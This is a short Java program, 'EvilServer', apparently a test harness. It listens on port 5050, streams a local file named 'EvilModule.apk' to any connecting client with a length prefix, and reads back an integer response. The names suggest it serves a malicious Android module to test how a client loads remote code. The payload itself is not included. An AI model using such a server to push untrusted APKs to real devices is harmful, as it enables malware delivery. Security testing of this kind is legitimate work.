import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;

public class EvilServer {

    public static final int PORT = 5050;
    public static final String evilTestFile = "./EvilModule.apk";

    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = new ServerSocket(PORT);

        while(true) {
            Socket socket = serverSocket.accept();
            Thread thread = new Thread(() -> {
                try {
                    System.out.println("server client " + socket.getInetAddress().getHostAddress() + ":" + socket.getPort());
                    serve(socket);
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    closeSilently(socket);
                }
            });
            thread.setDaemon(false);
            thread.start();
        }
    }

    private static void serve(Socket socket) throws IOException {
        OutputStream out = socket.getOutputStream();

        File file = new File(evilTestFile);
        System.out.println(file.length());
        try (InputStream in = new FileInputStream(evilTestFile)) {

            int fileSize = (int) file.length();
            ByteBuffer byteBuffer = ByteBuffer.allocate(4);
            byteBuffer.putInt(fileSize);
            byte[] bufferFileSize = byteBuffer.array();
            out.write(bufferFileSize, 0, 4);

            byte[] buffer = new byte[1024];
            int read = in.read(buffer, 0, buffer.length);
            int total = get(read);
            while (read > 0) {
                out.write(buffer, 0, read);
                read = in.read(buffer, 0, buffer.length);
                total += get(read);
            }

            out.flush();


            InputStream sockIn = socket.getInputStream();
            DataInputStream dataInputStream = new DataInputStream(sockIn);
            int response =  dataInputStream.readInt();

            socket.close();

            System.out.println("Served " + total + " bytes.");
            System.out.println("Response:  " + response);
        }


    }

    private static int get(int read) {
        if (read > 0) return read;
        return 0;
    }

    private static void closeSilently(Socket socket) {
        if (socket == null) return;
        try {
            socket.getInputStream().close();
            socket.getOutputStream().close();
            socket.close();
        } catch (IOException e) {}
    }
}
